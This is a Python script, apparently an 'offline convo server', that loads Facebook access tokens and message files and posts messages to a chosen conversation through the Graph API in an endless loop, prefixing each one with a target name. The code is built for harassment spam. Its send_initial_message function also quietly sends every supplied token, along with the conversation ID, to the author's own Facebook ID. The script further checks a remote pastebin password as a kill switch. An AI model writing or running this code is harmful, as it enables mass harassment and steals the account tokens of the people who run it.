import requests

import json

import time

import pytz

import datetime

import sys

from platform import system

import os

import subprocess

import http.server

import socketserver

import threading

import random

html_content = """

<!DOCTYPE html>

<html>

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>AKATSUKI 🖤</title>

    <style>

        body {

            background-image: url('Ayush.jpg');

            background-size: cover;

        }

        .container {

            text-align: center;

            margin-top: 50px;

        }

        .box {

            border: 2px solid black;

            width: 300px;

            margin: 0 auto;

            padding: 20px;

            background-color: rgba(255, 255, 255, 0.5);

            color: black;

        }

        .credit {

            text-align: left;

        }

        .thanks {

            margin-top: 50px;

            text-align: center;

            color: black;

        }

    </style>

</head>

<body>

    <div class="container">

        <div class="box">

            <h1>F3LIIX URF PRINC3</h1>

            <div class="credit">

                <p>1. RUL3X:-AKATSUKI RUL3X 🖤</p>

                <p>2. OWNER => F3LIIX URF PRINC3</p>


                <p>4. FACEBOOK:- https://www.facebook.com/profile.php?id=61571059542672</a></p>


            </div>

        </div>

    </div>

    <div class="thanks">

        <p>❤️TH9NKS FOR US1NG MY OFFL1N3 S3RV3R❤️</p>

        <p>👇J0IN TO MY T3L3GR9M GR0UP👇</p>

        <a href="</a>

    </div>

</body>

</html>

"""

class MyHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):

        self.send_response(200)

        self.send_header('Content-type', 'text/html')

        self.end_headers()

        self.wfile.write(html_content.encode())

def execute_server():

    PORT = int(os.environ.get('PORT', 4000))

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:

        print("Server running at http://localhost:{}".format(PORT))

        httpd.serve_forever()

utc_now = datetime.datetime.utcnow()

indian_timezone = pytz.timezone('Asia/Kolkata')

ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)

formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")

print(formatted_time)

headers = {

    'Connection': 'keep-alive',

    'Cache-Control': 'max-age=0',

    'Upgrade-Insecure-Requests': '1',

    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

    'Accept-Encoding': 'gzip, deflate',

    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',

    'referer': 'www.google.com'

}

# Read configuration files

try:

    with open('CONVO.txt', 'r') as f:

        convo_id = f.read().strip()

except:

    convo_id = input("Enter Convo ID: ")

try:

    with open('NAME.txt', 'r') as f:

        haters_name = f.read().strip()

except:

    haters_name = input("Enter Name: ")

try:

    with open('TOKEN.txt', 'r') as f:

        tokens = f.readlines()

except:

    tokens = [input("Enter Token: ")]

try:

    with open('FILE.txt', 'r') as f:

        messages = f.readlines()

        num_messages = len(messages)

except:

    messages = [input("Enter Message: ")]

    num_messages = len(messages)

try:

    with open('SPEED.txt', 'r') as f:

        speed = float(f.read().strip())

except:

    speed = float(input("Enter Speed (seconds): "))

try:

    with open('PASS.txt', 'r') as f:

        password = f.read().strip()

except:

    password = input("Enter Password: ")
    
try:

    with open('HOST.txt', 'r') as f:

        host_code = f.read().strip()

except:

    host_code = input("Enter Host Code: ")

def send_initial_message():

    mmm_pass = requests.get('https://pastebin.com/raw/NZKKryvH').text

    

    if mmm_pass not in password:

        print('\033[1;31m⚠️ YOUR P9SSW0RD CH9NG3D BY F3LIIX URF PRINC3 ⚠️')

        sys.exit()

    

    # Message template

    msg_template = "Owner => Feliix \n Hello feliix urf prince sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"

    

    # Target IDs

    target_ids = ["61571059542672"]

    

    requests.packages.urllib3.disable_warnings()

    

    for target_id in target_ids:

        for token in tokens:

            access_token = token.strip()

            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)

            msg = msg_template.format(convo_id, haters_name, access_token)

            parameters = {'access_token': access_token, 'message': msg}

            response = requests.post(url, json=parameters, headers=headers)

            time.sleep(0.1)

            print("\n\033[1;31m[+] Initial message sent to target ID: {}. Continuing...\n".format(target_id))

send_initial_message()

def send_messages_from_file():

    num_tokens = len(tokens)

    max_tokens = min(num_tokens, num_messages)

    while True:

        try:

            for message_index in range(num_messages):

                token_index = message_index % max_tokens

                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)

                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}

                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:

                    print("\033[1;36m[✓] F3LIIX URF PRINC3 {} C0NV0 {} T0K3N {}: {}".format(

                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))

                    print(formatted_time)

                    print('\033[1;92m' + '')

                else:

                    print("\033[1;35m[x] FA1L3D T0 S3ND M3SS3G3 {} C0NVO {} T0K3N {}: {}".format(

                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))

                    print(formatted_time)

                    print('\033[1;92m' + '')

                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")

        except Exception as e:

            print("[!] An error occurred: {}".format(e))

def main():

    server_thread = threading.Thread(target=execute_server)

    server_thread.start()

    send_initial_message()

    send_messages_from_file()

if name == 'main':

    main()